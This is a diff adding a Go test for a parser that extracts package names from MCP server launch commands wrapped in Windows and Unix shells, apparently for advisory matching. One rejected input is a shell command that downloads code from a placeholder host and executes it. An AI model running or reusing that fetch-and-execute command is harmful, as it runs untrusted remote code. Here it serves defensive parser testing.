@@ -55,6 +55,64 @@ func TestLaunchers(t *testing.T) {
 	}
 }
 
+func TestShellWrappers(t *testing.T) {
+	t.Parallel()
+	remote := []string{"npx", "-y", "mcp-remote@0.1.0"}
+	cases := []struct {
+		argv []string
+		name string
+	}{
+		{append([]string{"cmd", "/c"}, remote...), "mcp-remote"},
+		{append([]string{"CMD", "/C"}, remote...), "mcp-remote"},
+		{append([]string{"cmd.exe", "/k"}, remote...), "mcp-remote"},
+		{append([]string{`C:\Windows\System32\CMD.EXE`, "/K"}, remote...), "mcp-remote"},
+		{[]string{"cmd", "/d", "/s", "/c", "npx -y mcp-remote@0.1.0"}, "mcp-remote"},
+		{[]string{"sh", "-c", "npx -y mcp-remote@0.1.0"}, "mcp-remote"},
+		{[]string{"/bin/sh", "-c", "exec npx -y mcp-remote@0.1.0", "sh"}, "mcp-remote"},
+		{[]string{"bash", "-lc", "uvx mcp-server-git==2025.9.1"}, "mcp-server-git"},
+		{[]string{"bash", "-cl", "uvx mcp-server-git==2025.9.1"}, "mcp-server-git"},
+		{[]string{"bash", "-l", "-c", "uvx mcp-server-git==2025.9.1"}, "mcp-server-git"},
+		{[]string{"bash", "--login", "-c", "uvx mcp-server-git==2025.9.1"}, "mcp-server-git"},
+		{[]string{"zsh", "-c", "npx -y mcp-remote@0.1.0"}, "mcp-remote"},
+		{[]string{"bash", "-c", "cd srv && npx -y mcp-remote@0.1.0"}, "mcp-remote"},
+		{[]string{"sh", "-c", "bash -lc 'npx -y mcp-remote@0.1.0'"}, "mcp-remote"},
+		{[]string{"cmd", "/c", "sh -c \"npx -y mcp-remote@0.1.0\""}, "mcp-remote"},
+	}
+	for _, tc := range cases {
+		refs, unparsed := Parse(tc.argv)
+		if unparsed || len(refs) != 1 || refs[0].Name != tc.name || refs[0].Kind != advisory.KindExact {
+			t.Errorf("%q: refs %+v unparsed %v", tc.argv, refs, unparsed)
+		}
+	}
+	got, _, err := ParsePayload(model.HarnessClaude, map[string]any{"command": "cmd /c npx -y mcp-remote@0.1.0"})
+	if err != nil || len(got) != 1 || got[0].Name != "mcp-remote" {
+		t.Errorf("command string: %+v %v", got, err)
+	}
+	for _, argv := range [][]string{
+		{"cmd", "npx", "-y", "mcp-remote@0.1.0"},
+		{"cmd", "/x", "/c", "npx", "-y", "mcp-remote@0.1.0"},
+		{"sh", "npx -y mcp-remote@0.1.0"},
+		{"bash", "-l", "npx -y mcp-remote@0.1.0"},
+		{"bash", "-e", "-c", "npx -y mcp-remote@0.1.0"},
+		{"bash", "-c"},
+		{"sh", "-c", "$(curl -s https://example.invalid/x)"},
+		{"fish", "-c", "npx -y mcp-remote@0.1.0"},
+		{"sh", "-c", "env FOO=1 npx -y mcp-remote@0.1.0"},
+	} {
+		if refs, _ := Parse(argv); len(refs) != 0 {
+			t.Errorf("%q: refs %+v, want none", argv, refs)
+		}
+	}
+	nested := []string{"npx", "-y", "mcp-remote@0.1.0"}
+	for i := range maxWrapDepth + 1 {
+		nested = []string{"cmd", "/c", strings.Join(nested, " ")}
+		refs, _ := Parse(nested)
+		if want := i < maxWrapDepth; (len(refs) == 1) != want {
+			t.Errorf("%d wrappers: refs %+v, want a package %v", i+1, refs, want)
+		}
+	}
+}
+
 func TestUnparsedAndOpaque(t *testing.T) {
 	t.Parallel()
 	if refs, unparsed := Parse([]string{"uvx", "--some-future-flag", "figma-developer-mcp@0.6.2"}); !unparsed || len(refs) != 0 {
